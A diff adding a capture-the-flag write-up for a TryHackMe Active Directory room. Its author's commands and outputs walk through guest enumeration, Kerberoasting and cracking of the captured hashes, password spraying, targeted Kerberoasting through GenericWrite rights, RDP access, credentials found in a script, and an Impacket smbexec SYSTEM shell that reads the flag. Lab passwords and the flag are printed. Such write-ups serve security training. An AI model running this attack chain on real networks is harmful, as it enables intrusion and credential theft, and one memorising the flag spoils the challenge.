@@ -1,3 +1,239 @@
 This challenge will focus on exploiting an Active Directory environment.
 
+                                                                                                                              
+┌──(dhruv㉿kali)-[~]
+└─$ nmap -A -T4 -p- -sV 10.48.146.19
+
+┌──(dhruv㉿kali)-[~]
+└─$ nxc smb 10.49.156.27 -u 'guest' -p '' --shares 
+SMB         10.49.156.27    445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         10.49.156.27    445    AD               [+] thm.local\guest: 
+SMB         10.49.156.27    445    AD               [*] Enumerated shares
+SMB         10.49.156.27    445    AD               Share           Permissions     Remark
+SMB         10.49.156.27    445    AD               -----           -----------     ------
+SMB         10.49.156.27    445    AD               ADMIN$                          Remote Admin
+SMB         10.49.156.27    445    AD               C$                              Default share
+SMB         10.49.156.27    445    AD               IPC$            READ            Remote IPC
+SMB         10.49.156.27    445    AD               NETLOGON                        Logon server share
+SMB         10.49.156.27    445    AD               SYSVOL                          Logon server share
+                                            
+                                         
+                                                                              
+┌──(dhruv㉿kali)-[~]
+└─$ nxc ldap 10.49.156.27 -u 'guest' -p ''
+LDAP        10.49.156.27    389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
+LDAP        10.49.156.27    389    AD               [+] thm.local\guest: 
+                         
+                                                                                             
+┌──(dhruv㉿kali)-[~]
+└─$ nxc ldap 10.49.156.27 -u 'guest' -p '' --kerberoasting kerberoastables.txt
+LDAP        10.49.156.27    389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
+LDAP        10.49.156.27    389    AD               [+] thm.local\guest: 
+LDAP        10.49.156.27    389    AD               [*] Total of records returned 1
+LDAP        10.49.156.27    389    AD               [*] sAMAccountName: CODY_ROY, memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local, pwdLastSet: 2024-05-10 10:06:07.611965, lastLogon: 2024-04-24 11:41:18.970113
+LDAP        10.49.156.27    389    AD               $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$8d6a5967c5880e18abdee9d4de4108ed$6e1455a24ec47b7f178d56f7df834ab035200500824f227038eb41470515fdd9bacafe8ed57863f1444aa7f20770e1106c85aa1f2a165a1ccf54e151b490834000b9fc498bdeaad6b6e6adafe20b4e58f027ef17a946c7fb1b7b709475ffc9fa93983985526e210196fda264c85f907be4f47a12babac65acd6a36d67e0f5c95769d46e85a802f837e69b1567779f2f98325dbe1fde2eea3e3bb46154ea05120a0ed0470997da6e298169763cdf57286b5d4ab0d04962c6785d052e487c3a378ac7c7443d6e6e28273d04a0f076cb358caef0386bce811500ec38b775da528a6e66adac909cb8dd8e6f1c1d198116fb8ac9f55a53b296d12133821ce405f5c90343f58bc177047e9f03fb20bcaba1a8911fde3813847013b1bea0081a55f8973fce7b054ca4de9bc8621d348111f1129aa3147d7fb92d99033e2526c8c842be1090a5173fcf72c0d751131c51812954a966062a5f75bd9095f3564055a6afd2d8d634b40a6dd97eba1ba012d6f8fa7399a1b88d28470a65cf0d96986bd7d717e2c401bb06017547d67bead6b3d3334f83723b1d28a2d3857f510394eebffdd4746e2f852837af0890e61cf727fe8d6ac5dc48fb0d440a23243e69f1796d4d2af07fecb21c14f9e475c00804cc2069026a7669e9fbb71737d24900cce91df5ff368cf4d2474eda172c1e072c365b30f1a925d2c15fd55d260a125e70e9757c80447d7f63fe6371b9f93935ce6fa669de1248a1eb5aca0cc495bdf6331ca9baa65f33205bc353d15e19beebf6983da8212f8a583453052507ed6c849dbff8e1b184c8c4038b40762545005d49998138faa560e0ec964df280ad8ab461f49c862bcf4ecc8b5abd7fe6249fc6bbf82d5fe42d2193bf564b4c5bbbf80588beacb956aa6f7a38ed03aa400a6dbbf631390ba330325244944f861100fc6ea875ec3bbb4a7321f31d1bad787e8704ba89aecef1e9016e185c04ae071a0a06a9fa5ee6ae07a69dac7ed34c8577bea765c66a11365d35a9746f4dbcb89022dfe65edcaa85591632cdb43722d0d1177ce320f544d8a0f7a55f796502cbabf6da8bd5fa6723387f490dfa73e0d91119f020964997976c2eef188e7fa2c90b71a343b354225b11548d4a5963c4b0c6d843204c3918a13d899aeea39ffd7aaa038eb8c96c3a66bdc44e1722f12a5180705f52b14f6fdc763db2d26ae911e6ee5d441d214f8d1696e7cc9669dcc824a640fbc4e91cca3ddf6b674aa4fd40557c79307b788898c9c03c979368e3bd2d7fd10b0044b8e9039fb8b2ec5754e5f6c29205a1de79fa2b5b381fffe59b1cace5bf24c4e5a563e7be508bf1ed792845bcb40f2aee370d09c660ca01b69be8050502daa5060b91b811e0ed06051784cd7bfac1b76376153
+         
+         
+                                                                                      
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+MKO)mko0         (?)     
+1g 0:00:00:00 DONE (2026-03-05 14:11) 5.263g/s 3729Kp/s 3729Kc/s 3729KC/s MOSSIMO..JENNER
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                            
+
+         
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ bloodhound-ce-python -u 'cody_roy@thm.local' -p 'MKO)mko0' --zip -dc ad.thm.local -c All -d thm.local -ns 10.49.156.27  --dns-timeout 10 --dns-tcp
+        
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ ls                   
+ 20260305144235_bloodhound.zip   kerberoastables.txt   main  'nmap .txt'
+         
+         
+         
+                                                                                            
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users
+
+LDAP        10.49.156.27    389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
+LDAP        10.49.156.27    389    AD               [+] thm.local\cody_roy:MKO)mko0 
+LDAP        10.49.156.27    389    AD               [*] Enumerated 489 domain users: thm.local
+LDAP        10.49.156.27    389    AD               -Username-                    -Last PW Set-       -BadPW-  -Description-
+LDAP        10.49.156.27    389    AD               Administrator                 2024-05-10 10:09:56 0        Tier 1 User
+LDAP        10.49.156.27    389    AD               Guest                         2024-05-10 13:48:41 0        Tier 1 User
+LDAP        10.49.156.27    389    AD               krbtgt                        2024-05-10 13:01:07 0        Tier 1 User
+LDAP        10.49.156.27    389    AD               SHANA_FITZGERALD              2024-05-10 13:09:45 1
+LDAP        10.49.156.27    389    AD               CAREY_FIELDS                  2024-05-10 13:09:45 1
+LDAP        10.49.156.27    389    AD               DWAYNE_NGUYEN                 2024-05-10 13:09:45 1        Tier 1 User
+LDAP        10.49.156.27    389    AD               BRANDON_PITTMAN               2024-05-10 13:09:45 1        Tier 1 User
+LDAP        10.49.156.27    389    AD               BRET_DONALDSON                2024-05-10 13:09:45 1
+LDAP        10.49.156.27    389    AD               VAUGHN_MARTIN                 2024-05-10 13:09:45 1        Tier 1 User
+LDAP        10.49.156.27    389    AD               DICK_REEVES                   2024-05-10 13:09:45 1
+
+
+                                                                                                      
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | awk '{print $5}'
+[*]
+[+]
+[*]
+-Username-
+Administrator
+Guest
+krbtgt
+SHANA_FITZGERALD
+CAREY_FIELDS
+DWAYNE_NGUYEN
+BRANDON_PITTMAN
+BRET_DONALDSON
+          
+copy paste All Username
+ 
+
+                                                                                                     
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ head users.txt 
+Administrator
+Guest
+krbtgt
+SHANA_FITZGERALD
+        
+         
+         
+                                                                                           
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ nxc smb ad.thm.local -u users.txt -p 'MKO)mko0' --continue-on-success
+SMB         10.49.156.27    445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         10.49.156.27    445    AD               [-] thm.local\Administrator:MKO)mko0 STATUS_LOGON_FAILURE
+SMB         10.49.156.27    445    AD               [-] thm.local\Guest:MKO)mko0 STATUS_LOGON_FAILURE 
+                 
+ SMB         10.49.156.27    445    AD               [+] thm.local\CODY_ROY:MKO)mko0 
+ SMB         10.49.156.27    445    AD               [+] thm.local\ZACHARY_HUNT:MKO)mko0 
+ 
+ 
+ Checking the permissions for the zachary_hunt user in BloodHound, we can see that the user has GenericWrite rights over the jerri_lancaster user. We can use this to perform a targeted Kerberoasting attack by leveraging our write permissions to add a temporary SPN to that user and then requesting a service ticket to perform the usual Kerberoasting.
+ 
+ 
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ bloodhound
+
+ opening http://127.0.0.1:8080
+
+ZACHARY_HUNT@THM.LOCAL 
+
+Check Outbound Object  Control  
+
+
+ZACHARY_HUNT@THM.LOCAL = Generic Write = JERRI_LANCASTER@THM.LOCAL
+
+Using targetedKerberoast.py for this, we are able to capture the hash for the jerri_lancaster user.
+
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ python3 /home/dhruv/targetedKerberoast/targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
+[*] Starting kerberoast attacks
+[*] Attacking user (JERRI_LANCASTER)
+[VERBOSE] SPN added successfully for (JERRI_LANCASTER)
+[+] Printing hash for (JERRI_LANCASTER)
+$krb5tgs$23$*JERRI_LANCASTER$THM.LOCAL$thm.local/JERRI_LANCASTER*$506d028d769254f62d94d15ddcef7892$ca7c4be1173a7ba1687f7c4d0786e62e68a9eb57d36747c171866bfd26eb35ad038ad9b02d139b8aff4e1dce48544ba8d103cc13660c1dd6f4a51fb3cd6c8a3e5304c90843bde8fb043be0146a9797d8e73c100fbc36a951ae8650f587a4740cdf784f00d7444fbee3a36b44b54ef15992261307b2a555dba12583173481cb88e75b3e26015662f7d7be1dd0d4e4682ebaa46cdfd11860a1b0cd2ee47873f148ac4e84478e3901d154b3fd1748fff26fb545e359062ad1ac3e31fcc8ceefa46e566353de3d598dc4d9613ae6b24f4e5046819187dee5922fca72367dccc702965a8f56d766aadc34df10a74e346caf02991141fca767ade9c61682028cf09ae5c33e813ec9aac20be08db2d336bc19bf3bb16d4f3d07257db8ca16d50bc6f4efee4c589426c3d7a3a613f1cfd412bab99680942c3f9c0f3ce3aa88af87e1e9bc02cc75ef1178c6fedb471b31cd20376037e79d2e9eee94bcb2f7663bcc4d785ff0552b9eac3e156ce1269ec7fa800512a67aaeccfac9a6dfcf5ddf538b76b036c9f2e72fcbebd58a4c04917be70e3f7e3abcf8ade2c4e8d287e061cc595d420e56af73a8bd2505a5512d85d9ca4675893d667ca25eebc4840c6fe41efcaf452b35b7d8095f83e363d3afa1a9b16b7268d847d8bb74b93c4b9ef3aff1bc3f432b8596ee33b41d6bb129c6f3ab0f1efb43c750575deff970e0e0cc152c0ff4131e8d33e4a2530fd02e4921c0d63976a459456fb3c980d8dc1548eef88996c22d2dd5e08c634629287790f588704855799bd065c79ccf543e5b36ca34010a6f9f6e129987020eef161cc2ba3aeed5d870d77cf3f5878085b970a6997ef9b19cc484681715cd8ac90f8a3db3bf003b504c8320964aee7c4396f9f33189febc5d698afb8a516b47feb1a6fc60d8de984d0a6d202804b585bfba3217abe0f76b7a00d88565d3e018ac1e207945f8783038f099245a996e64644011ac6ab66296894244bdbb2197602875473d5f093185e19ff2cf925c38fa9557676e07ecdd061cc676ee42776399a4fae79a527412b9d3974c6919a6ffea330b77b4788df25d8e6bd34ecad8a6872fd7ca97d3ddf433dccf8e092c93e6eeed9c0f41521e8049ac45c1df1703f15a4d03f1db46d97faed59c414ec335fd381303fcc6df93e0b8dd96838020af98a5277e7eaec9048c4fa03b05bf086ed101daf6b3e53d1fe8a24ac726b5783bb384e7bbe2f27fb2d6ca9f1adce09694877acfbc830bbd16e79737dc3de5616d75b3c39fa37afe290ddd3a434c29f4d2052fea2a53f6719fc3b307bc64b89d3c36caa6605d0392c9fcec76dc6536dd2c0c2c58d2f0742335ee2405882bb458ce62bd460a79afbd3e14b6716954019643c01b833fddbca8970a8faf92de75a70246d66245b8821e81f1dfdbae4ee651d922a0fb563d113c91164880530eb8c98ed0f231398421317e2a831a58d5b0e041ec3137285f1674c3fe8914b9cd8802d9ce01de1240de5be696956c9a3331020c364345
+[VERBOSE] SPN removed successfully for (JERRI_LANCASTER)
+                                       
+Using john, we are able to successfully crack the hash and discover the password for the user.
+
+Kerberos TGS hash
+                                                                                                                
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ john --format=krb5tgs jerri-hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+No password hashes left to crack (see FAQ)
+                                                                                                                 
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ john --show jerri-hash
+?:lovinlife!
+
+1 password hash cracked, 0 left
+            
+lovinlife! 
+
+Checking the permissions for jerri_lancaster in BloodHound, we can see that the user is a member of the Remote Desktop Users group. 
+
+JERRI_LANCASTER@THM.LOCAL is Member of RDP users
+
+
+Knowing this, we can try to RDP to the machine using xfreerdp.
+
+ 
+                                                                                                                       
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ xfreerdp /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore 
+
+We are successfully able to RDP to the machine; however, we encounter some errors related to profile creation for the user. This is not an issue, as we can simply ignore them and use the WIN + R shortcut to spawn a Run dialog box, which we use to launch a command prompt by entering cmd.
+
+Using this command prompt to enumerate the file system, we notice an interesting directory on C:\ called Scripts.
+
+> dir C:\
+> dir C:\Sripts
+> type C:\Scripts\syncer.ps1
+
+Username:- sanford_daugherty
+Password:- RESET_ASAP123
+
+Testing these credentials, we confirm that they work. Additionally, the sanford_daugherty user is a local administrator on the target machine, as indicated by (Pwn3d!) in the netexec output.
+
+
+                                                                                                                 
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ nxc smb ad.thm.local -u 'sanford_daugherty' -p 'RESET_ASAP123' 
+SMB         10.48.156.27    445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         10.48.156.27    445    AD               [+] thm.local\sanford_daugherty:RESET_ASAP123 (Pwn3d!)
+    
+Knowing this, we can use smbexec from Impacket to spawn a shell as SYSTEM and read the flag located at C:\Users\Administrator\Desktop\flag.txt.txt to complete the room.
+                                               
+
+                                                                                                                 
+┌──(dhruv㉿kali)-[~/Operation-Endgame]
+└─$ python  /usr/share/doc/python3-impacket/examples/smbexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@ad.thm.local'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
+C:\Windows\system32>cd C:\Users
+[-] You can't CD under SMBEXEC. Use full paths.
+C:\Windows\system32>dir C:\Users
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users
+
+03/07/2026  05:12 AM    <DIR>          .
+03/07/2026  05:12 AM    <DIR>          ..
+05/12/2023  07:34 AM    <DIR>          .NET v4.5
+05/12/2023  07:34 AM    <DIR>          .NET v4.5 Classic
+05/10/2024  01:42 PM    <DIR>          Administrator
+12/12/2018  07:45 AM    <DIR>          Public
+03/07/2026  05:12 AM    <DIR>          TEMP
+               0 File(s)              0 bytes
+               7 Dir(s)  12,462,096,384 bytes free
+
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt.txt
 THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
+C:\Windows\system32>
+
+
+
+THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
+
+Done 🔥🚀
+
